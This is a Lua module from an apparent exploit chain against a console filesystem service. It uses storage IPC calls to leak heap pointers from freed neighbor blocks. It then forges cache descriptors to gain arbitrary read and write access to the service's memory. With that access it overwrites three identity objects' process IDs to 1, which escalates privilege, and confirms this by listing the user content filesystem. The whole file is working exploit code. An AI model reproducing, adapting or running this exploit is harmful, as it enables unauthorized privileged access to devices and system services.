-- s2_promote.lua — Neighbor Release, Address Qualification, Root Scan & Promotion

local P    = require("s2_prim")
local FS   = require("s2_fs")
local RACE = require("s2_race")

local M = {}

local math_floor = math.floor
local math_min   = math.min
local math_max   = math.max
local math_abs   = math.abs
local str_byte   = string.byte
local str_char   = string.char
local str_sub    = string.sub
local str_rep    = string.rep
local str_format = string.format
local tbl_concat = table.concat

local ZERO_24    = str_rep("\0", 24)
local ZERO_32    = str_rep("\0", 32)
local ZERO_56    = str_rep("\0", 56)
local ZERO_0X3FE0 = str_rep("\0", 0x4000 - 32)
local POISON_16  = str_rep(str_char(0xA5), 16)

function M.prepare_release_neighbors(rt, fs, setup, config, alias_res, log_fn)
    local function log(msg) if log_fn then log_fn(msg) end end
    local extra_storages = {}
    if not alias_res.candidateHandle or alias_res.candidateHandle == 0 or not alias_res.aliasInstalled then
        return {ok = true, extraStorages = extra_storages}
    end

    local MAX_NEIGHBORS = 8
    local PRIME_BLOCKS  = 30
    local prime_buf     = rt.alloc_page(0x1000)

    local pin_h = setup.handles.pinHandle
    if pin_h and pin_h ~= 0 and pin_h ~= alias_res.candidateHandle then
        for pi = 0, PRIME_BLOCKS - 1 do
            local poff = (240 + pi) * config.CONTROL_SIZE
            if poff ~= config.ALIAS_OFFSET and (poff + config.CONTROL_SIZE) <= (config.STORAGE_SIZE or 0x40000000) then
                fs.ipc_storage_read(pin_h, poff, 16, prime_buf)
            end
        end
    end

    for _ = 1, MAX_NEIGHBORS do
        local eh = fs.open_content_storage(setup.handles.rootSession)
        if eh == 0 then break end
        local prime_ok = true
        for pi = 0, PRIME_BLOCKS - 1 do
            local er = fs.ipc_storage_read(eh, pi * config.CONTROL_SIZE, 16, prime_buf)
            if er.error ~= 0 then
                prime_ok = false
                break
            end
        end
        if not prime_ok then
            rt.close_handle(eh)
            break
        end
        extra_storages[#extra_storages + 1] = eh
    end
    setup.handles.extraStorages = extra_storages
    log(str_format("LEAK: primed %d/%d neighbor storages", #extra_storages, MAX_NEIGHBORS))
    return {ok = true, extraStorages = extra_storages}
end

local function find_effective_end(rt, buf_addr, cache_read_size, control_size)
    local last16 = rt.rd(buf_addr + cache_read_size - 16, 16)
    if last16 ~= POISON_16 then return cache_read_size end
    local lo, hi = control_size, cache_read_size
    while lo < hi do
        local mid = math_floor((lo + hi) / 16) * 8
        if rt.rd(buf_addr + mid, 8) == P.POISON_A5_8 then
            hi = mid
        else
            lo = mid + 8
        end
    end
    return lo
end

function M.release_neighbors_and_find_pointers(rt, fs, setup, config, alias_res, log_fn)
    local function log(msg) if log_fn then log_fn(msg) end end
    local candidate_handle = alias_res.candidateHandle
    local prime_hex        = alias_res.primeHex
    local extra_storages   = setup.handles.extraStorages or {}

    local buf_prev = rt.alloc_page(config.CACHE_READ_SIZE + 0x2000)
    local buf_cur  = rt.alloc_page(config.CACHE_READ_SIZE + 0x2000)
    rt.memset(buf_prev, 0xA5, config.CACHE_READ_SIZE)

    local read0 = fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_prev)
    if read0.error ~= 0 then
        return {ok = false, pointerCandidates = {}, stopReason = "baseline-read-failed"}
    end
    local prefix0 = P.hex(rt.rd(buf_prev, 16))
    local prev_end = find_effective_end(rt, buf_prev, config.CACHE_READ_SIZE, config.CONTROL_SIZE)
    if prefix0 ~= prime_hex or prev_end <= config.CONTROL_SIZE then
        return {ok = false, pointerCandidates = {}, stopReason = "baseline-not-qualified"}
    end

    local pointer_candidates = {}
    local function scan_snapshot(round_idx, round_name)
        local prefix_n = P.hex(rt.rd(buf_cur, 16))
        if prefix_n ~= prime_hex then return false, 0 end
        local cur_end = find_effective_end(rt, buf_cur, config.CACHE_READ_SIZE, config.CONTROL_SIZE)
        local eff_end = math_min(prev_end, cur_end)
        local off = config.CONTROL_SIZE
        while (off + config.CONTROL_SIZE) <= eff_end do
            local prev_head8 = rt.rd(buf_prev + off, 8)
            local cur_head8  = rt.rd(buf_cur + off, 8)
            if prev_head8 ~= cur_head8 then
                local c_val      = P.u64(cur_head8, 0)
                -- Floor >= 0x1000000000 (64 GiB, probe-reserved-gap-seedsow.cjs:102) avoids low static mappings
                local is_ptr     = (c_val >= 0x1000000000 and c_val < 549755813888)
                local is_aligned = is_ptr and ((c_val % 0x4000) == 0)
                local low24_ok   = is_ptr and ((c_val % 0x1000000) ~= 0)
                if is_ptr and is_aligned and low24_ok then
                    local prev_block = rt.rd(buf_prev + off, config.CONTROL_SIZE)
                    local cur_block  = rt.rd(buf_cur + off, config.CONTROL_SIZE)
                    -- Check multi-word allocator free-list header sizes (native-links.cjs HEADER_SIZES)
                    local changed_header = 0
                    for _, hsz in ipairs({8, 0x10, 0x18, 0x20, 0x28}) do
                        if str_sub(prev_block, hsz + 1) == str_sub(cur_block, hsz + 1) then
                            changed_header = hsz
                            break
                        end
                    end
                    local tail_match    = (changed_header > 0)
                    local zero_tail     = (str_sub(cur_block, 9, 64) == ZERO_56)
                    local zero_after_32 = (str_sub(cur_block, 33, 0x4000) == ZERO_0X3FE0)
                    local strength = 0
                    if tail_match then
                        strength = 3
                    elseif zero_tail then
                        strength = 2
                    elseif zero_after_32 then
                        strength = 1
                    end
                    if strength > 0 then
                        pointer_candidates[#pointer_candidates + 1] = {
                            offset        = off,
                            target        = c_val,
                            previous      = P.u64(prev_head8, 0),
                            round         = round_idx,
                            neighbor      = round_name,
                            changedLink   = tail_match,
                            changedHeader = changed_header,
                            zeroTail      = zero_tail,
                            zeroAfter32   = zero_after_32,
                            strength      = strength
                        }
                    end
                end
            end
            off = off + config.CONTROL_SIZE
        end
        return true, cur_end
    end

    local function has_strong()
        for i = 1, #pointer_candidates do
            if pointer_candidates[i].strength == 3 and pointer_candidates[i].changedLink then
                return true
            end
        end
        return false
    end

    for i = 1, #extra_storages do
        local eh = extra_storages[i]
        rt.close_handle(eh)
        extra_storages[i] = 0
        rt.memset(buf_cur, 0xA5, config.CACHE_READ_SIZE)
        local rn = fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_cur)
        if rn.error ~= 0 then break end
        local ok_s, cur_end = scan_snapshot(i, "extra" .. (i - 1))
        if not ok_s then break end
        buf_prev, buf_cur = buf_cur, buf_prev
        prev_end = cur_end
    end
    for i = 1, #extra_storages do
        if extra_storages[i] ~= 0 then
            rt.close_handle(extra_storages[i])
            extra_storages[i] = 0
        end
    end

    local pin_h = setup.handles.pinHandle
    local aux_h = setup.handles.auxiliaryStorageHandle
    local stor_sz = config.STORAGE_SIZE or 0x40000000

    if not has_strong() then
        local gbuf = rt.alloc_page(0x1000)
        -- Keep pin_h's 30 blocks held AND prime 30 blocks on aux_h (60 blocks pinned)
        -- so gr = 2, 3 cannot re-pop the top 60 LIFO freelist blocks from Round 1
        if aux_h and aux_h ~= 0 and aux_h ~= candidate_handle then
            for pi = 0, 29 do
                local aoff = (270 + pi) * config.CONTROL_SIZE
                if aoff ~= config.ALIAS_OFFSET and (aoff + config.CONTROL_SIZE) <= stor_sz then
                    fs.ipc_storage_read(aux_h, aoff, 16, gbuf)
                end
            end
        end
        for gr = 2, 3 do
            if has_strong() then break end
            local batch = {}
            local base_blk = (gr - 1) * 30
            for _ = 1, 8 do
                local eh = fs.open_content_storage(setup.handles.rootSession)
                if eh == 0 then break end
                local ok_p = true
                for pi = 0, 29 do
                    local goff = (base_blk + pi) * config.CONTROL_SIZE
                    if goff ~= config.ALIAS_OFFSET and (goff + config.CONTROL_SIZE) <= stor_sz then
                        if fs.ipc_storage_read(eh, goff, 16, gbuf).error ~= 0 then
                            ok_p = false
                            break
                        end
                    end
                end
                if not ok_p then
                    rt.close_handle(eh)
                    break
                end
                batch[#batch + 1] = eh
            end
            if #batch == 0 then break end
            rt.memset(buf_prev, 0xA5, config.CACHE_READ_SIZE)
            local rp = fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_prev)
            if rp.error == 0 then
                prev_end = find_effective_end(rt, buf_prev, config.CACHE_READ_SIZE, config.CONTROL_SIZE)
                for bi = 1, #batch do
                    local eh = batch[bi]
                    rt.close_handle(eh)
                    batch[bi] = 0
                    rt.memset(buf_cur, 0xA5, config.CACHE_READ_SIZE)
                    local rn = fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_cur)
                    if rn.error ~= 0 then break end
                    local ok_s, cur_end = scan_snapshot(gr * 10 + bi, "r" .. gr .. "_extra" .. (bi - 1))
                    if not ok_s then break end
                    buf_prev, buf_cur = buf_cur, buf_prev
                    prev_end = cur_end
                end
            end
            for bi = 1, #batch do
                if batch[bi] ~= 0 then rt.close_handle(batch[bi]) end
            end
        end
    end

    for idx, h in ipairs({pin_h, aux_h}) do
        if h and h ~= 0 and h ~= candidate_handle then
            fs.ipc_storage_invalidate(h, 0, stor_sz)
            if not has_strong() then
                rt.memset(buf_cur, 0xA5, config.CACHE_READ_SIZE)
                if fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_cur).error == 0 then
                    local ok_s, cur_end = scan_snapshot(50 + idx, (idx == 1) and "pin-inv" or "aux-inv")
                    if ok_s then
                        buf_prev, buf_cur = buf_cur, buf_prev
                        prev_end = cur_end
                    end
                end
            end
        end
    end

    if not has_strong() then
        for mi = 1, config.MONITORING_ROUNDS do
            rt.wait_ms(10)
            rt.memset(buf_cur, 0xA5, config.CACHE_READ_SIZE)
            local rm = fs.ipc_storage_read(candidate_handle, config.ALIAS_OFFSET, config.CACHE_READ_SIZE, buf_cur)
            if rm.error ~= 0 then break end
            local ok_s, cur_end = scan_snapshot(#extra_storages + mi, "monitor" .. (mi - 1))
            if not ok_s then break end
            buf_prev, buf_cur = buf_cur, buf_prev
            prev_end = cur_end
            if has_strong() then break end
        end
    end

    table.sort(pointer_candidates, function(a, b)
        if a.strength ~= b.strength then return a.strength > b.strength end
        if a.target ~= b.target then return a.target < b.target end
        return a.offset < b.offset
    end)

    if #pointer_candidates > 0 then
        local best = pointer_candidates[1]
        local h_str = (best.changedHeader and best.changedHeader > 0)
            and ((best.changedHeader == 8) and "8" or str_format("0x%x", best.changedHeader))
            or (best.zeroTail and "zeroTail" or "zeroAfter32")
        log(str_format("LEAK: %d pointer candidates (best=0x%x hdr=%s strength=%d)",
            #pointer_candidates, best.target, h_str, best.strength))
    else
        log("LEAK: 0 pointer candidates found")
    end
    return {ok = true, pointerCandidates = pointer_candidates}
end

-- ---------------------------------------------------------------------------
-- 2. Cache-Mapped Bounded Read & Bucket Period Qualification
-- ---------------------------------------------------------------------------
function M.read_fs_address_bytes(rt, fs, config, address_plan, candidate_handle, address, length, output_buf, allowed_window)
    local allowed_start = allowed_window and allowed_window.start
        or (address_plan and address_plan.lowerWindow and address_plan.lowerWindow.proposedStart) or 0
    local allowed_end   = allowed_window and allowed_window["end"]
        or (address_plan and (address_plan.target + config.CONTROL_SIZE)) or 0

    if not address or not length or length <= 0 or not address_plan or not address_plan.lowerWindow or
       address < allowed_start or (address + length) > allowed_end then
        return {ok = false, error = "address outside bounded window"}
    end

    local chunks = {}
    local cur_addr = address
    local remaining = length
    while remaining > 0 do
        local file_off = cur_addr - address_plan.addressBias
        local bucket_idx = (math_floor(file_off / config.CONTROL_SIZE) * config.CONTROL_SIZE) % config.ROOT_CAPTURE_CHUNK
        local req_off, prefix, take
        if bucket_idx == 0 then
            req_off = file_off
            prefix  = 0
            take    = math_min(remaining, config.ROOT_CAPTURE_CHUNK)
        else
            req_off = math_floor(file_off / config.ROOT_CAPTURE_CHUNK) * config.ROOT_CAPTURE_CHUNK
            prefix  = file_off - req_off
            take    = math_min(remaining, config.ROOT_CAPTURE_CHUNK - prefix)
        end
        local req_size = prefix + take
        if req_off < 0 or req_size <= 0 or (req_off + req_size) > address_plan.storageSize then
            return {ok = false, error = "aligned read outside IStorage"}
        end

        rt.memset(output_buf, 0xA5, req_size)
        local rep = fs.ipc_storage_read(candidate_handle, req_off, req_size, output_buf)
        if rep.error ~= 0 then
            return {ok = false, fatal = true, error = "IStorage::Read=" .. P.hex32(rep.error)}
        end
        if not rt.has_byte_different_fast(output_buf + prefix, take, 0xA5) then
            return {ok = false, fatal = true, error = "read window remained poison"}
        end
        chunks[#chunks + 1] = rt.rd(output_buf + prefix, take)
        cur_addr  = cur_addr + take
        remaining = remaining - take
    end
    local str = tbl_concat(chunks)
    return {ok = true, str = str, buffer = output_buf}
end

function M.qualify_cache_bucket_period(rt, fs, setup, config, campaign_state, candidate_handle, prime_hex, log_fn, should_stop)
    local ctrl_buf = rt.alloc_page(0x1000)
    rt.memset(ctrl_buf, 0xA5, 16)
    local ctrl = fs.ipc_storage_read(setup.handles.storageHandle, 0x28000, 16, ctrl_buf)
    if ctrl.error ~= 0 then return false end

    local p1 = RACE.install_address_header(rt, fs, setup, config, campaign_state,
        {0xC2, 0x80, 0x02}, "cache-period-prefix", log_fn, should_stop)
    if not p1.ok then return false end

    local p2 = RACE.install_address_header(rt, fs, setup, config, campaign_state,
        {}, "cache-period-zero", log_fn, should_stop)
    if not p2.ok then return false end

    local period_buf = rt.alloc_page(0x1000)
    rt.memset(period_buf, 0xA5, 16)
    local pr = fs.ipc_storage_read(candidate_handle, 0x28000, 16, period_buf)
    local p_hex = (pr.error == 0) and P.hex(rt.rd(period_buf, 16)) or ""
    return pr.error == 0 and p_hex == prime_hex
end

require("s2_scan").attach(M)

local function make_cache_entry_str(offset, address)
    local s = str_rep("\0", 0x30)
    s = P.put_u64(s, 0x00, offset)
    s = P.put_u64(s, 0x08, 0x4000)
    s = P.put_u8(s,  0x10, 1)
    s = P.put_u8(s,  0x11, 1)
    s = P.put_u8(s,  0x12, 1)
    s = P.put_u64(s, 0x20, address)
    s = P.put_u64(s, 0x28, 0x4000)
    return s
end

function M.qualify_and_promote(rt, fs, setup, config, campaign_state, alias_res, pointer_candidates, log_fn, should_stop)
    local function log(msg) if log_fn then log_fn(msg) end end
    local candidate_handle = alias_res.candidateHandle
    local prime_hex        = alias_res.primeHex

    local known, seen_targets = {}, {}
    local all_targets = {}
    for _, pc in ipairs(pointer_candidates) do
        all_targets[#all_targets + 1] = pc.target
        if pc.strength == 3 and pc.changedLink and not seen_targets[pc.target] then
            seen_targets[pc.target] = true
            known[#known + 1] = pc
        end
    end
    table.sort(known, function(a, b)
        return a.target < b.target
    end)
    if #known == 0 then
        return {ok = false, failureReason = "no-strength-3-changed-link-target"}
    end

    local storage_size = config.STORAGE_SIZE
    local candidate_plans = {}
    for i = 1, math_min(#known, config.MAX_ADDRESS_CANDIDATES) do
        local ok_p, plan = pcall(FS.build_lower_window_plan, known[i].target, storage_size, 0x28000, all_targets)
        if ok_p and plan then
            local enc = fs.check_address_header_encoding(plan.bytes, setup.handles.savedHandle)
            if enc.ok then
                candidate_plans[#candidate_plans + 1] = {candidate = known[i], plan = plan}
            end
        end
    end
    if #candidate_plans == 0 then
        return {ok = false, failureReason = "no-valid-address-plans"}
    end

    alias_res.activeReadOffset = 0x28000
    if not M.qualify_cache_bucket_period(rt, fs, setup, config, campaign_state, candidate_handle, prime_hex, log_fn, should_stop) then
        return {ok = false, failureReason = "cache-bucket-period-unqualified"}
    end

    local capture_buf = rt.alloc_page(config.ROOT_CAPTURE_CHUNK + 0x2000)
    local ord_buf     = rt.alloc_page(config.CONTROL_SIZE + 0x1000)
    local buf_a       = rt.alloc_page(config.CONTROL_SIZE + 0x1000)
    local buf_b       = rt.alloc_page(config.CONTROL_SIZE + 0x1000)

    local verified_root = nil
    local active_plan   = nil

    for ai = 1, #candidate_plans do
        if should_stop and should_stop() then break end
        local plan = candidate_plans[ai].plan
        rt.memset(ord_buf, 0xA5, config.CONTROL_SIZE)
        if fs.ipc_storage_read(setup.handles.storageHandle, plan.readOffset, config.CONTROL_SIZE, ord_buf).error ~= 0 then
            break
        end
        alias_res.activeReadOffset = plan.readOffset
        local hc = RACE.install_address_header(rt, fs, setup, config, campaign_state,
            plan.bytes, "cache-address-" .. ai, log_fn, should_stop)
        if not hc.ok or not campaign_state.workerStateSafe then
            return {ok = false, failureReason = "address-header-install-failed"}
        end
        active_plan = plan
        rt.memset(buf_a, 0xA5, config.CONTROL_SIZE)
        rt.memset(buf_b, 0x5A, config.CONTROL_SIZE)
        local ra = fs.ipc_storage_read(candidate_handle, plan.readOffset, config.CONTROL_SIZE, buf_a)
        local rb = fs.ipc_storage_read(candidate_handle, plan.readOffset, config.CONTROL_SIZE, buf_b)
        local stable     = (ra.error == 0 and rb.error == 0 and rt.buffers_equal_fast(buf_a, buf_b, config.CONTROL_SIZE))
        local differs    = (ra.error == 0 and not rt.buffers_equal_fast(buf_a, ord_buf, config.CONTROL_SIZE))
        local non_poison = (ra.error == 0 and rt.has_byte_different_fast(buf_a, config.CONTROL_SIZE, 0xA5))

        if stable and differs and non_poison then
            local md = M.discover_metadata_anchors(rt, fs, config, plan, candidate_handle, capture_buf, log_fn)
            for mi = 1, #(md.anchors or {}) do
                local anchor = md.anchors[mi]
                local page   = anchor.window.address
                local pts    = {}
                for k = 1, #all_targets do pts[k] = all_targets[k] end
                pts[#pts + 1] = math_floor(page / config.CONTROL_SIZE) * config.CONTROL_SIZE
                local ok_mp, mplan = pcall(FS.build_lower_window_plan, page, storage_size, config.ROOT_CAPTURE_CHUNK, pts)
                if ok_mp and mplan and fs.check_address_header_encoding(mplan.bytes, setup.handles.savedHandle).ok then
                    alias_res.activeReadOffset = mplan.readOffset
                    local mhc = RACE.install_address_header(rt, fs, setup, config, campaign_state,
                        mplan.bytes, "cache-meta-" .. mi, log_fn, should_stop)
                    if not mhc.ok then break end
                    active_plan = mplan
                    local pwin = {start = page, ["end"] = page + anchor.window.length}
                    local pa = M.read_fs_address_bytes(rt, fs, config, mplan, candidate_handle, page, anchor.window.length, buf_a, pwin)
                    local pb = pa.ok and M.read_fs_address_bytes(rt, fs, config, mplan, candidate_handle, page, anchor.window.length, buf_b, pwin) or {ok = false}
                    if pa.ok and pb.ok then
                        local aoff = anchor.window.anchorOffset
                        if P.u64(pa.str, aoff) == anchor.nodeAddress and
                           P.u64(pa.str, aoff + 8) == anchor.nodeAddress and
                           P.u64(pb.str, aoff) == anchor.nodeAddress then
                            local id_res = M.inspect_fsp_identity_targets(rt, fs, config, mplan, candidate_handle, capture_buf, log_fn)
                            if id_res.ok then
                                local wc = candidate_plans[ai].candidate
                                local wh = (wc.changedHeader and wc.changedHeader > 0)
                                    and ((wc.changedHeader == 8) and "8" or str_format("0x%x", wc.changedHeader))
                                    or (wc.zeroTail and "zeroTail" or "zeroAfter32")
                                log(str_format("PROMOTE MATCH: target=0x%x hdr=%s strength=%d",
                                    wc.target, wh, wc.strength))
                                verified_root = id_res
                                setup.handles.domainSession = id_res.domainSession
                                break
                            end
                        end
                    end
                end
            end
        end
        if verified_root then break end
    end

    if not verified_root then
        return {ok = false, failureReason = "root-identity-not-verified"}
    end

    -- Phase 2 & 3: Install Retained Two-Bucket Endpoint & Promote PIDs to 1
    local targets        = verified_root.verifiedIdentityTargets
    local domain_session = verified_root.domainSession
    local layout         = targets.retainedCache
    local array_addr     = layout.array
    local owner_addr     = layout.owner

    local array_plan = FS.build_lower_window_plan(array_addr, storage_size, config.ROOT_CAPTURE_CHUNK,
        {math_floor(array_addr / config.CONTROL_SIZE) * config.CONTROL_SIZE})
    if not fs.check_address_header_encoding(array_plan.bytes, setup.handles.savedHandle).ok then
        return {ok = false, failureReason = "retained-array-encoding-rejected"}
    end
    local before_arr = nil
    alias_res.activeReadOffset = array_plan.readOffset
    for _ = 1, 6 do
        local ahc = RACE.install_address_header(rt, fs, setup, config, campaign_state,
            array_plan.bytes, "cache-retained-array", log_fn, should_stop)
        if not ahc.ok then
            return {ok = false, failureReason = "retained-array-plan-install-failed"}
        end
        active_plan = array_plan
        local probe = M.read_fs_address_bytes(rt, fs, config, array_plan, candidate_handle, array_addr, 0x5A0, capture_buf)
        if probe.ok and str_sub(probe.str, 1, 16) == str_sub(array_plan.str, 1, 16) then
            before_arr = probe
            break
        end
    end
    if not before_arr then
        return {ok = false, failureReason = "retained-array-snapshot-failed"}
    end
    alias_res.retainedEndpointActive = true

    local write_buf = rt.alloc_page(0x1000)
    local function logical_read(off, len)
        rt.memset(capture_buf, 0xA5, len)
        local r = fs.ipc_storage_read(candidate_handle, off, len, capture_buf)
        assert(r.transport == 0 and r.error == 0, "logical_read failed")
        return rt.rd(capture_buf, len)
    end
    local function logical_write(off, data_str)
        rt.wr(write_buf, data_str)
        local r = fs.ipc_storage_write(candidate_handle, off, write_buf, #data_str)
        assert(r.transport == 0 and r.error == 0, "logical_write failed")
    end
    local function bootstrap_write(addr, data_str)
        local off = addr - active_plan.addressBias
        logical_write(off, data_str)
        local rb = M.read_fs_address_bytes(rt, fs, config, active_plan, candidate_handle, addr, #data_str, buf_a)
        assert(rb.ok and rb.str == data_str, "bootstrap_write readback differs")
    end
    if str_sub(before_arr.str, 0x31, 0x5A0) ~= str_rep("\0", 0x5A0 - 0x30) then
        bootstrap_write(array_addr + 0x30, str_rep("\0", 0x5A0 - 0x30))
    end

    local data_offset       = 0x4000
    local data_entry_offset = 0x90
    local scratch_offset    = 0x5A0 - 0x18
    -- Install data descriptor at array + 0x90 pointing to array itself
    bootstrap_write(array_addr + data_entry_offset, make_cache_entry_str(data_offset, array_addr))
    -- Write canonical control descriptor at array + 0x00 via data channel
    logical_write(data_offset, make_cache_entry_str(0, array_addr))
    local ctrl_arr = logical_read(0, 0x5A0)
    assert(P.u64(ctrl_arr, 0) == 0 and P.u64(ctrl_arr, 8) == 0x4000, "retained control descriptor invalid")

    local ep = {
        array           = array_addr,
        owner           = owner_addr,
        arrayLength     = 0x5A0,
        dataOffset      = data_offset,
        dataEntryOffset = data_entry_offset,
        scratchOffset   = scratch_offset,
        pointer         = array_addr,
        canonical       = true,
        ready           = true
    }

    local function set_retained_pointer(target_addr)
        local entry_s = logical_read(ep.dataEntryOffset, 0x30)
        assert(P.u64(entry_s, 0) == ep.dataOffset and P.u64(entry_s, 8) == 0x4000 and
               str_byte(entry_s, 0x11) == 1 and P.u64(entry_s, 0x20) == ep.pointer,
               "retained data descriptor changed")
        if target_addr ~= ep.pointer then
            local p8 = P.u64s(target_addr)
            logical_write(ep.dataEntryOffset + 0x20, p8)
            assert(logical_read(ep.dataEntryOffset + 0x20, 8) == p8, "retained pointer readback differs")
            ep.pointer = target_addr
        end
    end

    local function retained_read(addr, len)
        local out = {}
        local at = 0
        while at < len do
            local take = math_min(0x4000, len - at)
            set_retained_pointer(addr + at)
            out[#out + 1] = logical_read(ep.dataOffset, take)
            at = at + take
        end
        return tbl_concat(out)
    end

    local function retained_write(addr, data_str)
        local at = 0
        while at < #data_str do
            local part = str_sub(data_str, at + 1, math_min(at + 0x4000, #data_str))
            set_retained_pointer(addr + at)
            logical_write(ep.dataOffset, part)
            assert(logical_read(ep.dataOffset, #part) == part, "retained write readback differs")
            at = at + #part
        end
    end

    set_retained_pointer(owner_addr)
    local owner_before = logical_read(data_offset, 0x78)
    assert(P.u32(owner_before, 0x58) == 10, "retained owner count before disable ~= 10")
    logical_write(data_offset + 0x58, P.u32s(0))
    local owner_after = logical_read(data_offset, 0x78)
    assert(P.u32(owner_after, 0x58) == 0, "retained owner count after disable ~= 0")

    for _, field in ipairs(targets.fields) do
        local cur = retained_read(field.object, field.objectSize)
        assert(cur == field.beforeStr, field.name .. " changed before PID write")
        if field.before ~= 1 then
            retained_write(field.object + field.pidOffset, P.u64s(1))
        end
        local expected = P.put_u64(field.beforeStr, field.pidOffset, 1)
        local after = retained_read(field.object, field.objectSize)
        assert(after == expected, field.name .. " PID=1 verification failed")
    end
    set_retained_pointer(array_addr)
    log("PROMOTION: all 3 objects (root, nca, save) verified with PID=1")

    local cmd110_pkt = P.domain_packet(domain_session.rootObj, 110, P.u32s(1))
    local open_rep = fs.send_packet(domain_session.handle, cmd110_pkt, setup.pktBuf, {domain = true, data_size = 0})
    assert(open_rep.transport == 0 and open_rep.result == 0 and #open_rep.objects == 1,
        "OpenContentStorageFileSystem(User=1) failed")
    local user_fs_obj = open_rep.objects[1]
    local user_fs_h   = fs.clone_object(domain_session.handle, user_fs_obj)
    assert(user_fs_h ~= 0, "clone User content filesystem failed")
    local listing = fs.ipc_list_directory(user_fs_h, "/", 3)
    rt.close_handle(user_fs_h)
    fs.close_domain_object_now(domain_session.handle, user_fs_obj, setup.pktBuf)
    assert(listing.error == 0, "User content root listing failed")
    log(str_format("FINAL ACCESS: User content root listed (%d entries)", #listing.entries))

    -- Export promoted state to _G.fsKaihen and _G.fspSrv
    _G.fspSrv = domain_session
    _G.fsKaihen = {
        domainSession   = {handle = domain_session.handle, rootObj = domain_session.rootObj},
        candidateHandle = candidate_handle,
        storageSize     = storage_size,
        endpoint        = {
            array           = ep.array,
            owner           = ep.owner,
            arrayLength     = ep.arrayLength,
            dataOffset      = ep.dataOffset,
            dataEntryOffset = ep.dataEntryOffset,
            scratchOffset   = ep.scratchOffset
        },
        domainLayout    = targets.domainLayout,
        identityObjects = {
            {name = "root", object = targets.fields[1].object, objectSize = 0x40, pidOffset = 0x30, pid = targets.fields[1].before},
            {name = "nca",  object = targets.fields[2].object, objectSize = 0x60, pidOffset = 0x20, pid = targets.fields[2].before},
            {name = "save", object = targets.fields[3].object, objectSize = 0x60, pidOffset = 0x28, pid = targets.fields[3].before},
        }
    }

    return {
        ok                = true,
        promotionRetained = true,
        domainSession     = domain_session,
        retainedEndpoint  = ep
    }
end

return M
